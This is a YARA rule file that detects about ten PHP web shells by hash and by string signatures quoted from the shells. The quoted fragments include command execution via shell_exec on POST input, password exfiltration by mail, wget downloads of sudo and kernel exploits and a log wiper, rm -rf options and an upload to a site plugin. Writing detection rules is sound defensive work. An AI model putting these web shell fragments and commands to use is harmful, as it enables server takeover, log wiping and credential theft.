/*
   YARA Rule Set
   Author: Renaltha P. B.
   Date: 2023-02-09
   Identifier: shell
   Reference: https://github.com/renalthapb/Yara-Repo
*/

/* Rule Set ----------------------------------------------------------------- */

rule shell_recode_izin {
   meta:
      description = "shell - Recode Izin"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-02-09"
      hash1 = "5aed486e7f4bdb4eb33395d1a1531ec56b1870ffb4f1ea26fc8d4dc77fc60852"
   strings:
      $s1 = "$cmd = shell_exec($_POST['cmd'].' 2>&1');" fullword ascii
      $s2 = "<script src='//cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/prism.js'></script>" fullword ascii
      $s3 = "<script src='//code.jquery.com/jquery-3.3.1.slim.min.js'></script>" fullword ascii
      $s4 = "<title>\".$_SERVER['HTTP_HOST'].\" - $_n</title>" fullword ascii
      $s5 = "if(isset($_GET['option']) && $_POST['opt'] == 'download'){" fullword ascii
      $s6 = "$ipas = getenv('HTTP_X_FORWARDED_FOR');" fullword ascii
      $s7 = "else if(getenv('HTTP_X_FORWARDED_FOR'))" fullword ascii
      $s8 = "$ipas = getenv('HTTP_FORWARDED');" fullword ascii
      $s9 = "Server Ip: <gr>\".gethostbyname($_SERVER['HTTP_HOST']).\"</gr><br />" fullword ascii
      $s10 = "$ipas = getenv('HTTP_FORWARDED_FOR');" fullword ascii
      $s11 = "else if(getenv('HTTP_FORWARDED'))" fullword ascii
      $s12 = "else if(getenv('HTTP_X_FORWARDED'))" fullword ascii
      $s13 = "$ipas = getenv('HTTP_X_FORWARDED');" fullword ascii
      $s14 = "elseif(!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'):" fullword ascii
      $s15 = "else if(getenv('HTTP_FORWARDED_FOR'))" fullword ascii
      $s16 = "<div class='corner text-secondary anu'>shell bypass 403</div>" fullword ascii
      $s17 = "for($i = 0; $byt >= 1024 && $i < (count($sz) -1 ); $byt /= 1024, $i++ );" fullword ascii
      $s18 = "mass_kabeh($_POST['d_dir'], $_POST['d_file'], $_POST['script']);" fullword ascii
      $s19 = " = mass_kabeh($dirc,$namafile,$isi_script);" fullword ascii
      $s20 = "mass_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      8 of them
}

rule shell_adoh {
   meta:
      description = "shell - Adoh"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-02-09"
      hash1 = "60017dff1e1f117d80152fd69df219fb92ed1dacf1c91643cd17d00179a45c15"
   strings:
      $s1 = "<link href=\"https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css\" rel=\"stylesheet\" type=\"text/css" ascii
      $s2 = "echo(' <textarea  style=\"font-size: 8px; border: 1px solid white; background-color: black; color: white; width: 100%;height: 12" ascii
      $s3 = "<link href=\"https://fonts.googleapis.com/css?family=Kelly+Slab\" rel=\"stylesheet\" type=\"text/css\">" fullword ascii
      $s4 = "0px;\" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');" fullword ascii
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string '                    ' */
      $s6 = "<textarea cols=80 rows=20 name=\"src\" style=\"font-size: 8px; border: 1px solid white; background-color: black; color: white; w" ascii
      $s7 = "h: 100%;height: 1000px;\">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />" fullword ascii
      $s8 = "Permission : <input name=\"perm\" type=\"text\" size=\"4\" value=\"'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'\" st" ascii
      $s9 = "<i class='fa fa-desktop'></i> <td>: <font color='lime'>\".gethostbyname($_SERVER['HTTP_HOST']).\" / \".$_SERVER['SERVER_NAME']." ascii
      $s10 = "Permission : <input name=\"perm\" type=\"text\" size=\"4\" value=\"'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'\" st" ascii
      $s11 = "<i class='fa fa-desktop'></i> <td>: <font color='lime'>\".gethostbyname($_SERVER['HTTP_HOST']).\" / \".$_SERVER['SERVER_NAME']." ascii
      $s12 = "$_POST[$key] = stripslashes($value);" fullword ascii
      $s13 = "}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){" fullword ascii
      $s14 = "if(isset($_GET['option']) && $_POST['opt'] == 'delete'){" fullword ascii
      $s15 = "foreach($_POST as $key=>$value){" fullword ascii
      $s16 = "echo '<script>alert(\"File Gagal Diupload !!\")</script>';" fullword ascii
      $s17 = "echo '<br><br><font color=\"lime\">UPLOAD SUCCES !!!!</font><br/>';" fullword ascii
      $s18 = "AAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFU" ascii
      $s19 = "D/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2" ascii
      $s20 = "Z7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMa" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule shell_Watching {
   meta:
      description = "shell - Watching"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-02-09"
      hash1 = "b23ab33950c03ea09261cfa2dcf4e0ba477233b42e6b62468578f9ec87104f9a"
   strings:
      $x1 = " '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href=\"https://nullrefer.com/?https://www.google.com/search?q='.urlencode(@php_u" ascii
      $s2 = "die(\"</br></br><pre align=center><form method=post style='font-family:Nunito, sans-serif;color:#1a1a1a; text-shadow: 2px 0 0 #0" ascii
      $s3 = "<!-- particles --> <div id='particles-js'></div><script src='https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></scr" ascii
      $s4 = "<!-- particles --> <div id='particles-js'></div><script src='https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js'></scr" ascii
      $s5 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=postgres\";" fullword ascii
      $s6 = "$explink = 'http://nullrefer.com/?https://www.exploit-db.com/search/?action=search&description=';" fullword ascii
      $s7 = "if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {" fullword ascii
      $s8 = "$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'].\"\\n\".$_POST['pass']; @mail('test@testmail.com', 'root', $tmp); // Edit or" ascii
      $s9 = "if(isset($_POST['p3'])) $_POST['p3'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s10 = "if(isset($_POST['c'])) $_POST['c'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['c'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s11 = "if(isset($_POST['p1'])) $_POST['p1'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s12 = "echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SERVER" ascii
      $s13 = "$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);" fullword ascii
      $s14 = "if(isset($_POST['a'])) $_POST['a'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s15 = "if(isset($_POST['p2'])) $_POST['p2'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s16 = "$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'].\"\\n\".$_POST['pass']; @mail('test@testmail.com', 'root', $tmp); // Edit or" ascii
      $s17 = "d.mf.p1.value = encrypt(d.mf.p1.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s18 = "d.mf.p3.value = encrypt(d.mf.p3.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s19 = "d.mf.a.value = encrypt(d.mf.a.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s20 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch', 'Frame');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule shell_HorCux {
   meta:
      description = "shell - HorCux"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-02-09"
      hash1 = "76594cf502c929d40873d58b45e4aa2893ebbea27154282a333b7620a435833c"
   strings:
      $x1 = "<table id=pagebar><tr><td width=50%><p>Software : Apache. <a href=\"?x=phpinfo\" target=\"_blank\"><b><u>PHP/5.4.45</u></b></a> " ascii
      $x2 = "    <option value=\"ls -la\">ls -la</option><option value=\"ps -x\">ps -x</option><option value=\"-----\">-----</option><option " ascii
      $x3 = "rver IP : <a href=http://whois.domaintools.com/103.247.11.105 target='_blank'>103.247.11.105</a> - Your IP : <a href=http://whoi" ascii
      $s4 = "ymlink,syslog,openlog,openlog,closelog,ocinumcols,listen,chgrp,apache_note,apache_setenv,debugger_on,debugger_off,ftp_exec,dll,f" ascii
      $s5 = "s.domaintools.com/103.119.141.199 target='_blank'>103.119.141.199</a><br>Freespace : 212.77 MB of 14.87 GB (1.4%)</p></td></tr><" ascii
      $s6 = "ketstormsecurity.com/0908-exploits/wunderbar_emporium.tgz\">wunderbar_emporium (wunderbar)</option><option value=\"wget http://p" ascii
      $s7 = "ketstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">wget WIPELOGS PT1</option><option value=\"gcc zap2.c -o zap2\">gcc WIP" ascii
      $s8 = "t http://www.securityfocus.com/data/vulnerabilities/exploits/sudo-exploit.c\">wget Sudo Exploit</option>    </select> -" fullword ascii
      $s9 = "tp,myshellexec,socket_bind,fpassthru, posix_getpwuid</b></font></p></td></tr><tr><td colspan=2 id=mainmenu><a href=\"?x=ftpquick" ascii
      $s10 = "hellcmd,passthru,proc_close,proc_get_status,proc_nice,proc_open,proc_terminate,shell_exec,popen,pclose,dl,pfsockopen,leak,apache" ascii
      $s11 = "    <input type=hidden name=\"cmd_txt\" value=\"1\"> - <input type=submit name=submit value=\"Execute\">" fullword ascii
      $s12 = "GS PT2</option><option value=\"./zap2\">Run WIPELOGS PT3</option><option value=\"\">-----</option><option value=\"wget http://ww" ascii
      $s13 = "<td><form method=\"post\" action=\"http://google.com/search\">" fullword ascii
      $s14 = "<table id=pagebar><tr><td width=50%><p>Software : Apache. <a href=\"?x=phpinfo\" target=\"_blank\"><b><u>PHP/5.4.45</u></b></a> " ascii
      $s15 = "<a href=\"http://www2.packetstormsecurity.org/cgi-bin/search/search.cgi?searchvalue=Linux+Kernel\">[esploit]</a>" fullword ascii
      $s16 = "h=\"19\" border=\"0\"></a>&nbsp;<a href=\"?x=f&f=error_log&ft=download&d=%2Fhome%2Fimin9862%2Fpublic_html%2Fhome\"><img src=\"?x" ascii
      $s17 = "<tr><td><a href=\"?x=f&f=error_log&d=%2Fhome%2Fimin9862%2Fpublic_html%2Fhome\"><img src=\"?x=img&img=ext_error_log\" border=\"0" ascii
      $s18 = "<a href=\"http://tools.kerinci.net/?x=injector\">[injek]</a>" fullword ascii
      $s19 = "</option><option value=\"rm -Rf\">Format box (DANGEROUS)</option><option value=\"\">-----</option><option value=\"wget http://ww" ascii
      $s20 = "<tr><td><a href=\"?x=f&f=configurations.php&d=%2Fhome%2Fimin9862%2Fpublic_html%2Fhome\"><img src=\"?x=img&img=ext_php\" border=" ascii
   condition:
      uint16(0) == 0x683c and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule shell_SPYRO_KiD {
   meta:
      description = "shell - SPYRO KiD"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-02-09"
      hash1 = "d48b3d4298c89ba16ec8f25588cc9014721ace467536084b42ac8864a6815336"
   strings:
      $s1 = "echo exec($cmdType.' -r '.$fileDest.' \"'.$fileName.'\"');" fullword ascii
      $s2 = "echo exec($cmdType.' -rf \"'.$fileName.'\"');" fullword ascii
      $s3 = "echo exec($cmdType.' '.$fileName);" fullword ascii
      $s4 = "$path = exec(\"pwd\");" fullword ascii
      $s5 = "<form name=\"zip\" method=\"POST\" action=\"wtools.php\">" fullword ascii
      $s6 = "echo \"<br><a href='http://\".$_SERVER['HTTP_HOST'].\"/\".$fileDest.\"'>\".$fileDest.\"</a>\";" fullword ascii
      $s7 = "<form name=\"rmunzip\" method=\"POST\" action=\"wtools.php\">" fullword ascii
      $s8 = "$cmdType = $_POST['t'];" fullword ascii
      $s9 = "if($cmdType!=\"\" && $fileName!=\"\"){" fullword ascii
      $s10 = "$fileDest = $_POST['d'];" fullword ascii
      $s11 = "//SPYRO KiD" fullword ascii
      $s12 = "$fileName = $_POST['f'];" fullword ascii
      $s13 = "<input type=\"Submit\" Value=\"Go Ahead!\">" fullword ascii
      $s14 = "switch($cmdType){" fullword ascii
      $s15 = "echo \"<br><br><b>\".$cmdType.\"</b><br>\".$fileName;" fullword ascii
      $s16 = "File Output:<br><input type=\"text\" size=\"35\" name=\"d\" value=\"\"><br>" fullword ascii
      $s17 = "echo \"Haters gonna hate!\";" fullword ascii
      $s18 = "<input type=\"radio\" name=\"t\" value=\"unzip\" checked>Unzip&nbsp;&nbsp;<input type=\"radio\" name=\"t\" value=\"rm\">rm<br><b" ascii
      $s19 = "<h3><?php echo $path; ?></h3>" fullword ascii
      $s20 = "<input type=\"hidden\" name=\"t\" value=\"zip\"><br><br>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule shell_H3NING_MAL4M {
   meta:
      description = "shell - H3NING_MAL4M"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-02-09"
      hash1 = "219848d37c6f1e98658ea31b5b174110c1e4bb1b97bc5906cf6bc8647cb0cbcf"
   strings:
      $s1 = "  <h1><center>H3NING_MAL4M</h1><br></center><center>IM EVERYWHERE - KIW</center><br><center><form method='post'><input style='te" ascii
      $s2 = "  <h1><center>H3NING_MAL4M</h1><br></center><center>IM EVERYWHERE - KIW</center><br><center><form method='post'><input style='te" ascii
      $s3 = "KgXNgaZML4r/fTvKwu1KXAJS71aIZ/i/eAch5Z3ltP8zbILuVZX7dPoH/psdIKLzz8OaeqBCklog1UuqohBmSyyIjeQr5tF5UHlzifuhbjn7W9uw83j4VapvQVRLwQyN" ascii
      $s4 = "function Login() {" fullword ascii
      $s5 = "vwyDcT1PydgrlGAWmMMgu0JjJEb/bAbD4Wu8QSYViComPrd3vOrd+3auzfr/Mx1+rS9vGu2q/ay369V5ttvmEjlfEhtTbEhwNWBvPZy47dTj9tVnqgo3QFuz+KQ56ZTo" ascii
      $s6 = "mYbqEpZt4GIagpzwCogh+qg2og+OWhQWmiVLFJZH0KFnFVTt0t9aqmWZXPnLxGNcw7/GpkGRbApOzj9xRdlZqLR/wimUldlksVMBOA1MLDM9ZE+EbINCDaWAJMQvnL7i" ascii
      $s7 = "xt-align:center;' type='password' name='pass'></form>" fullword ascii
      $s8 = "Wwz9CrsgiiQHvel0eQ4MaG5ABvBvnhYfwWW1PWCYqvl7vVdhgIivU9BehB2hUTcrO6Pf41b+d+ACe3zJJS2lEgKM6vUspPWqQLZaWCuaoFMVBaZOQantpso0WEoo6yCq" ascii
      $s9 = "5sHFHPQnylJBwmirawiBH711r/46wDcSZXWuezUJzL3LNUxdjZ7ON/Z3PO0rmp5AH1C2zYL88vENza+krqOmXyGIuSqBvSqa6eHFxpj7EnM719ZgGPZigTEZjXJFUR1i" ascii
      $s10 = "yyzbxxmIwDw/BHC87cCi4b95s+Y7QX0iZOxahUXOQeJmvBctD7yRVr05CxuQQ0g91TH/WO0DH3lWMGt6ptYGsGSInjE4jfaG6rI6U0QPxbpAsXtdC5AoF4jiIaaKucYX" ascii
      $s11 = "4CZ/iUhsSMiEwZHXM7Ryq8XkdG6piPF81W3yoCVKNntndl1n+BA49n8snt/kH889mUGsGPXAGWyDKI6FsFg7UETkfK2R8STkeAh4ajXs6/zDzoUu+g2nYZZ4WMsYfAd7" ascii
      $s12 = "py6JdQymJeh7xbEjIfsnrMnVgsWX4ZG9bpcieZESvahqH1HXIOTrWQB8WpJvp6600W4otrE6psC3X50XfReJLbwrGTLN3Zqlo3ulK+5t6SRQZGEExfHkbI+Msg/wlI6n" ascii
      $s13 = "FT3eJdwP0OL+f4L9fR/+tshjhRzBbytoNcsU/Guev/bYTvILLigma6m+weByH/FgyY8ClC46mVZkCKMSyic+wGJZ3dI4GhzfOPWEubMSB1yhtk9kbh8sHh5lYjYW/74b" ascii
      $s14 = "sx+dTRmGkkanvNSAz/nHiPhZ+IO8Ccn8p+2R7T1TXe0ls+6EEEfSPIB/pvbKdJoD7OpfdMSZXwHZYtUJcCeC7CDvzAsJefG3+n3G5lhpG6veuNfwv8MaY+aEr19otOmk" ascii
      $s15 = "dos3x7VXf2pZQuimscLBkf1/tPokW8RCvGiri4I/fYiQiMYwlwZ8Tcf4Mpg/DP/PkO9zXnoWOh4ilKnd//JxR9d/PQdwsALmjKm/73pmVt/sJBYVNYlnd2JnYii6YZXt" ascii
      $s16 = "TRYoMahOKJ4nQ3/LWGmRi+pn7cT74jjW+GzkMYSmoI5S4w5ASC7lwTT2vYeay+OuE7lP9PAPl9RGsY7UHDqlH1wvAD9i98O/428g/BhOInO08UfMEYBTyBg1HFucYpFM" ascii
      $s17 = "xab1x6moW1M60fKcCnw23upOJcbY3OxSOucQl1ygGavaBRhstdjH25xYOZPfywTzRZfuKS7ZcZTKuKTM8AanaFYIVUtYAXxnlOr5ZSo2GRJStMBQQt1Whd2VjuqiFIpW" ascii
      $s18 = "W9QD7VBYYVZi2NbM7XxqybMjA6c5KTA0XSmE+p24h1GGbRqqLpPbsHcWrdw5JvUkzaDAUhlmHXaVKyW88Z04JrJTELi5eSjpRR2yPUZigmhhFi5oOReSL4mo+AuOYe5b" ascii
      $s19 = "85INxpD61V0tpXaDGmep5m8l4MdeyDYVvJ1pwLS+PTiO5lv6SUPAPNG6LrHTQO94TbSi0cNbcDcWNtNPj/w1pAaLb+mANirEO1sVgaFKYFV+aKRjMjXrF6tYS3meheH2" ascii
      $s20 = "DmgeNzzyk0j/ClxDZRTBnBFZGqCq99Yu7EtqbzhHFKbETZ0ZsJ7N4soD4hRNgVmmnUAWoM2TY3eFyuMImNEkjdzI2DnndRCEHfKknTVFKbCsUIVWPLEMuSC5vxz5wnpj" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule shell_cf7 {
   meta:
      description = "shell - file cf7.php"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-02-09"
      hash1 = "3f0ffa7eb574e92408454ac95d3a8db68b176a9e36a101ee6d8e0e81e631aa18"
   strings:
      $s1 = "$ch = curl_init(\"http://sman70-jkt.sch.id/70/wp-content/plugins/contact-form-7/modules/file.php\");" fullword ascii
      $s2 = "curl_setopt($ch, CURLOPT_POSTFIELDS," fullword ascii
      $s3 = "array('zip'=>\"@$shahab\"));" fullword ascii
      $s4 = "$result = curl_exec($ch);" fullword ascii /* Goodware String - occured 1 times */
      $s5 = "$shahab=\"ew.html\";" fullword ascii
      $s6 = "print \"$result\";" fullword ascii
      $s7 = "curl_setopt($ch, CURLOPT_POST, true);" fullword ascii /* Goodware String - occured 2 times */
      $s8 = "curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);" fullword ascii /* Goodware String - occured 4 times */
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule shell_track {
   meta:
      description = "shell - file track.php"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-02-09"
      hash1 = "2be8ff3cb1e1f9a81a0579342e2d7bd968a761b3b3c7b1132aad6e001a581999"
   strings:
      $s1 = "if ($stmt->execute() === TRUE)" fullword ascii
      $s2 = "$stmt->bind_param('sssssssssssss', $trackerId,$session_id,$cid,$public_ip,$ip_info,$user_agent,$screen_res,$date_time,$user_brow" ascii
      $s3 = "$stmt->bind_param('sssssssssss', $trackerId,$session_id,$cid,$public_ip,$ip_info,$user_agent,$screen_res,$date_time,$user_browse" ascii
      $s4 = "$stmt->bind_param('sssssssssssss', $trackerId,$session_id,$cid,$public_ip,$ip_info,$user_agent,$screen_res,$date_time,$user_brow" ascii
      $s5 = "$stmt->execute();" fullword ascii
      $s6 = "$stmt->bind_param('sssssssssss', $trackerId,$session_id,$cid,$public_ip,$ip_info,$user_agent,$screen_res,$date_time,$user_browse" ascii
      $s7 = "getenv('HTTP_FORWARDED_FOR')?:" fullword ascii
      $s8 = "getenv('HTTP_FORWARDED')?:" fullword ascii
      $s9 = "getenv('HTTP_X_FORWARDED_FOR')?:" fullword ascii
      $s10 = "getenv('HTTP_X_FORWARDED')?:" fullword ascii
      $s11 = "header('Access-Control-Allow-Headers: Content-Type');" fullword ascii
      $s12 = "$stmt = $conn->prepare(\"INSERT INTO tb_data_webpage_visit(tracker_id,session_id,cid,public_ip,ip_info,user_agent,screen_res,tim" ascii
      $s13 = "$stmt = $conn->prepare(\"INSERT INTO tb_data_webform_submit(tracker_id,session_id,cid,public_ip,ip_info,user_agent,screen_res,ti" ascii
      $s14 = "$public_ip = getenv('HTTP_CLIENT_IP')?:" fullword ascii
      $s15 = "$stmt = $conn->prepare(\"INSERT INTO tb_data_webform_submit(tracker_id,session_id,cid,public_ip,ip_info,user_agent,screen_res,ti" ascii
      $s16 = "$user_os = $ua_info->getPlatformVersion();" fullword ascii
      $s17 = "$stmt = $conn->prepare(\"INSERT INTO tb_data_webpage_visit(tracker_id,session_id,cid,public_ip,ip_info,user_agent,screen_res,tim" ascii
      $s18 = "$user_browser = $ua_info->getName().' '.($ua_info->getVersion() == \"unknown\"?\"\":$ua_info->getVersion());" fullword ascii
      $s19 = "if(isset($POSTJ['cid']) && !empty($POSTJ['cid']))" fullword ascii
      $s20 = "getenv('REMOTE_ADDR');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule shell_Shadow_5hell_Minerva {
   meta:
      description = "shell - Shadow 5hell Minerva"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-02-09"
      hash1 = "39313b2b5e0f5088448ea727ddb75a8c4ae9dd22c1463c5b5f258ef23d14a5f5"
   strings:
      $x1 = " */ header('Cache-Control: no cache');session_cache_limiter('private_no_expire');ini_set('display_errors','On');$k0=sys_get_temp" ascii
      $x2 = " */ function getClientIp(){if(isset($_SERVER['HTTP_CLIENT_IP'])){$p22=$_SERVER['HTTP_CLIENT_IP'];}elseif(isset($_SERVER['HTTP_X_" ascii
      $x3 = " */ function logout(){session_unset();session_destroy();}function logger($v10){$p16=getClientIp();$v10=getVariable('email');$b17" ascii
      $x4 = "</form>\";}if(isset($_POST['massSubmit'])){$x57=$_POST['dataFile'];foreach($x57 as $f49){switch($_POST['massAction']){case '1':i" ascii
      $s5 = "</script>';}function getIcon($k29){if(is_dir($k29)){return \"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NA" ascii
      $s6 = "_dir();if(is_writable($k0)){ini_set('session.save_path',sys_get_temp_dir());}session_start();$o1=getVariable('password');$z2=$_S" ascii
      $s7 = " */ function getVariable($e9){$v10='Cvar1984@pm.me';if(function_exists('password_verify')){$o1='$2y$10$.WwaTEc/a4WSxMr0GZZypOSqk" ascii
      $s8 = "<script src=\"https://code.jquery.com/jquery-3.3.1.js\"></script>" fullword ascii
      $s9 = "])){$g14=$_POST[\"pass\"];$j15='';$_SESSION[$w3]=&$j15;if(verifyPassword($g14)){$j15=$i4;}echo \"<script>if(window.history.repla" ascii
      $s10 = "<script type=\"text/javascript\" src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.js\"></script>" fullword ascii
      $s11 = "<script type=\"text/javascript\" src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js\"></script>" fullword ascii
      $s12 = " */ function logout(){session_unset();session_destroy();}function logger($v10){$p16=getClientIp();$v10=getVariable('email');$b17" ascii
      $s13 = "=$_SERVER['HTTP_USER_AGENT'];$i18=$_SERVER['SCRIPT_FILENAME'];$z19=$_COOKIE['PHPSESID'];$f20=$_SERVER['SERVER_ADDR'].$_SERVER['S" ascii
      $s14 = " * @link https://github.com/Cvar1984" fullword ascii
      $s15 = " * @author Cvar1984 <Cvar1984@protonmail.com>" fullword ascii
      $s16 = "$o26);}function getEncodedCookie($w25){return hex2bin($_COOKIE[$w25]);}function cwd(){$g27=str_replace(\"\\\\\",\"/\",getcwd());" ascii
      $s17 = "rt(\"error\");}break;}}}if(isset($_POST['uploadFileSubmit'])){$g46=$_POST['type'];$e58=$_SERVER['DOCUMENT_ROOT'];$y66=hex2bin($_" ascii
      $s18 = "rn $p22;}if(!isset($_SESSION[$w3])){login();}if($_SESSION[$w3]!==$i4){login();}function getSelf(){$k23=(isset($_SERVER[\"QUERY_S" ascii
      $s19 = "ath']));setEncodedCookie(\"cwd\",hex2bin($_POST['path']));?>" fullword ascii
      $s20 = "ERVER['SERVER_ADDR'];$w3=bin2hex($_SERVER[\"HTTP_HOST\"]).$o1;$i4=sha1(getClientIp())?:$o1;function openFile($f5){if(function_ex" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}


rule shell_ZXC {
   meta:
      description = "shell - ZXC"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-02-09"
      hash1 = "fe7cc627e338a7f455eb4f1d1ba75b041a14e3f6daf5879a8a8de64f772dda18"
   strings:
      $s1 = "<?= @null; $ULTRA = \"eJwBwiE93gG9IULe7T1rd9pG0997Tv/DRvVTQWMEvrRNiSGJ89hO29SJceK3juPjI6m6GDtCWkCx9DT97e/M7kqsLoDAl6St6UkN0uzcdn" ascii
      $s2 = "2Zq9ff/X1V09tatuhoZ/Zjmc5tfpjAs+oZRnWmUVNw3JCfVRryY8jgz2A36EentnUqanpC3X12YvjYw6dvoXnZwzCVldbuXdBaJuRd5m+JznMsXdxRi+o7zrIoxPGlOG" ascii
      $s3 = "APsuwbcMKR6HeUTzd0C9jw7WLshWYyQprWoaGazK8PrWNmG2/akIRChGh3TwHWVtai8kJnpNLVxRm/2Xce73xsv+9//Ng4zfffets7/+00d/4Pni5Z5+Pj5//rL+0f6K" ascii
      $s4 = "2zs90tahtGjre/jx3AmnqubD8WGX+nQ1bemANeiMOAzyhuNpRsRMqeH5uQkVGVDm5mntmZhY6IOz8XnEue3vtP9dZ2MN9zpj6S83rC19WwNVgz5NJYfZoYFxIrc1mx9r" ascii
      $s5 = "JzZxHWVv/UWvhf7h15g8XV2n8Yx36c8O6iUh9IYXzTXJZlW9s/Ph5tX3vyReA/cyePF2xdO/FF/7k3MoaX0a+nJwZvFNdTIN/kvsPyG7oUCIeXs/1fPnu9Vl6GPUdTyk" ascii
      $s6 = "pgmsf2uEH6E3QiU9cuwfGfqK8UlaJ8jv7/zv2/zfs/3vs/89fKaeJTKaB/UAr+YkYRb8gIRdv+2P4AZEIA+p2yFprfTPTgPmbJn8jhR5I5eHD0j4VDFQPOMpVsl7XFAJ" ascii
      $s7 = "izKpndoZ7IfhlOcsZ2mQWsPT0FGnKatZ7+bTW+fs6FzTafJHrR+MzjDcJyheyYoYTTegAd1/+9RczPPz3pDO527ZE4ZNDVTN6LjyWztx9UtlYGVN36WCXMVx26OE1DDe" ascii
      $s8 = "IWKatGEgppqEVK5Ak6sUIWaINgfIwFDPNmtJUNFFkWtouiqWpb/VS+JEELeE/+VSfBJ4IkeCtys2EE7nEDKbms77oJHX5ANJ0g0ogJXuaDYyf7ADEtQOulP2pOdFtEZw" ascii
      $s9 = "7heF/r7TVVCxVpsAcFYB/NEKdN8ATQemkdbqaUGXKSL6vn57WSzDwv2gImm96Oo2aak7lCJBYeQrtQ/gNERI6arWoWVePIHydAl2uKEYFc3eEpbpMi+kdbQJ1lDeIUu5" ascii
      $s10 = "aYZVReuLyvUmWmGRUVGXe8BIN/mOsDgd6k+shlzO7KSdZ8fsy/4amtsQYBJoQvx51xtWh9erb5b9YaxGDScsZCubZpabCLh0seyGSl7+xGf2wmBmh4tKLLjNqm1gT19b" ascii
      $s11 = "o0DgTWiUwEM+HtmPXFFBAeHEGJcy+GwZKNnBZCQzEAzSfZuFqWF+GREOOACelxLcTVfcgZzhN/Wreo05K5PEWg67pEoysUYkEI8vM8M+gGP8j9Fql/PMy7G8F3jl0HmO" ascii
      $s12 = "WvnVffb16xzval61phi53hHKHwN/JXbs89M4085lHIOcPHGfLwRp447c4f1Cqx+qHJGdlT/O+ifxM/BuSn8n9hYp9Y5WcuzVcNKxrCnyDsi7eWJfoWGVppTO8MRdFn8Q" ascii
